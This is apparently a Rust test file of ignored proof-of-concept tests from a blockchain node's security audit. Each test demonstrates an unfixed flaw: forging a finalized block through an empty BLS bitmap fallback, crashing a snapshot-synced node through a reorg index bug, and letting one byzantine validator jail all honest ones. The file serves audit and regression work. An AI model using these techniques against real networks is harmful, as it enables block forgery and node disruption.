//! Preuves de concept de l'audit de sécurité (docs/AUDIT_SECURITE_2026-09.md).
//!
//! ATTENTION : chaque test ci-dessous **affirme la PRÉSENCE d'une vulnérabilité**.
//! Il passe tant que la faille existe et échouera dès qu'elle sera corrigée. Marqués
//! `#[ignore]` ; les exécuter avec
//! `cargo test -p vinx-node --test audit_poc_node -- --ignored`.
use vinx_core::{Block, BlockHeader, ValidatorSet};
use vinx_crypto::{bls_aggregate, Address, BlsSecretKey, KeyPair};
use vinx_node::chain::Chain;
use vinx_node::consensus::validate_block_with_registry;

fn addr() -> Address {
    Address::from_public_key(&KeyPair::generate().public_key())
}

/// FINDING: `bls_signer_count_from_bitmap` falls back to the unbound
/// `bls_cosigner_pks` path whenever `bls_bitmap` is empty. An attacker who holds
/// no validator key at all reaches quorum with self-generated BLS keys, so
/// `validate_block_with_registry` — the "registry-bound" check used by chain
/// sync — accepts a fully forged block.
#[test]
#[ignore = "asserts the presence of an unfixed vulnerability"]
fn poc_forged_quorum_via_empty_bitmap() {
    // A 7-validator set: quorum = ceil(2*7/3) = 5.
    let validators: Vec<Address> = (0..7).map(|_| addr()).collect();
    let vs = ValidatorSet::new(validators.clone());
    let quorum = vs.quorum();
    assert!(quorum >= 5);

    // Header names an honest validator as proposer — a public address, no key needed.
    let header = BlockHeader {
        height: 42,
        prev_hash: [0x11; 32],
        timestamp: 1_700_000_000,
        validator: validators[0],
        tx_count: 0,
        state_root: [0x22; 32],
        base_fee: 0,
        receipts_root: [0u8; 32],
    };
    let mut block = Block {
        header,
        transactions: vec![],
        bls_aggregate: None,
        bls_cosigner_pks: vec![],
        bls_bitmap: vec![], // <-- empty: triggers the legacy fallback
    };

    // The attacker generates `quorum` BLS keypairs of their own.
    let hash = block.hash();
    let sks: Vec<BlsSecretKey> = (0..quorum).map(|_| BlsSecretKey::generate()).collect();
    let sigs: Vec<_> = sks.iter().map(|sk| sk.sign(&hash)).collect();
    block.bls_aggregate = Some(bls_aggregate(&sigs).unwrap().0.to_vec());
    block.bls_cosigner_pks = sks.iter().map(|sk| sk.public_key().0.to_vec()).collect();

    // Registry says: NOBODY has a registered BLS key.
    let indexed: Vec<Option<[u8; 48]>> = vec![None; validators.len()];

    validate_block_with_registry(&block, &vs, &indexed)
        .expect("forged block accepted by the registry-bound validator");
    assert!(block.is_finalized(&vs), "and it counts as finalized");
}

/// FINDING: `Chain::reorg_replace` indexes `blocks` with the absolute height and
/// ignores `height_base`, so on a snapshot-synced node any fork-choice reorg
/// panics (out-of-range drain) — a remotely reachable node crash.
#[test]
#[ignore = "asserts the presence of an unfixed vulnerability"]
#[should_panic(expected = "out of range")]
fn poc_reorg_replace_panics_on_snapshot_synced_chain() {
    let proposer = addr();
    let snap_block = Block {
        header: BlockHeader {
            height: 1_000,
            prev_hash: [0u8; 32],
            timestamp: 1_000,
            validator: proposer,
            tx_count: 0,
            state_root: [0u8; 32],
            base_fee: 0,
            receipts_root: [0u8; 32],
        },
        transactions: vec![],
        bls_aggregate: None,
        bls_cosigner_pks: vec![],
        bls_bitmap: vec![],
    };
    let mut chain = Chain::new_from_snapshot(snap_block);
    let next = Block {
        header: BlockHeader {
            height: 1_001,
            prev_hash: chain.tip_hash(),
            timestamp: 1_012,
            validator: proposer,
            tx_count: 0,
            state_root: [0u8; 32],
            base_fee: 0,
            receipts_root: [0u8; 32],
        },
        transactions: vec![],
        bls_aggregate: None,
        bls_cosigner_pks: vec![],
        bls_bitmap: vec![],
    };
    chain.push(next);
    assert_eq!(chain.tip_height(), 1_001);

    let competitor = Block {
        header: BlockHeader {
            height: 1_001,
            prev_hash: chain.get_block(1_000).unwrap().hash(),
            timestamp: 1_013,
            validator: proposer,
            tx_count: 0,
            state_root: [0x99; 32],
            base_fee: 0,
            receipts_root: [0u8; 32],
        },
        transactions: vec![],
        bls_aggregate: None,
        bls_cosigner_pks: vec![],
        bls_bitmap: vec![],
    };
    // blocks.len() == 2 but height 1_001 is used directly as the drain index.
    chain.reorg_replace(1_001, competitor);
}

/// FINDING: any registered validator may propose at any height (no slot-timeout
/// enforcement on the accept path), and `reliability::on_block_applied` charges a
/// "missed proposal" to the *scheduled* leader every time somebody else produces.
/// One byzantine validator that always proposes first therefore jails every honest
/// validator after MAX_MISSED_PROPOSALS rounds and becomes the sole active leader.
#[test]
#[ignore = "asserts the presence of an unfixed vulnerability"]
fn poc_single_byzantine_validator_jails_the_whole_honest_set() {
    use vinx_core::reliability::{self, ReliabilityMap};

    let honest: Vec<Address> = (0..4).map(|_| addr()).collect();
    let attacker = addr();
    let mut all = honest.clone();
    all.push(attacker);
    let vs = ValidatorSet::new(all);

    let mut rel = ReliabilityMap::new();
    // The attacker proposes every block; the scheduled leader is never the attacker
    // except on its own slot.
    for height in 1..=60u64 {
        reliability::on_block_applied(&mut rel, &vs, height, &attacker);
    }

    let active = reliability::active_validators(&vs, &rel);
    assert_eq!(
        active,
        vec![attacker],
        "the attacker is the only validator left in the rotation: {active:?}"
    );
    for h in &honest {
        assert!(rel.get(h).unwrap().is_jailed(), "honest validator jailed");
    }
}
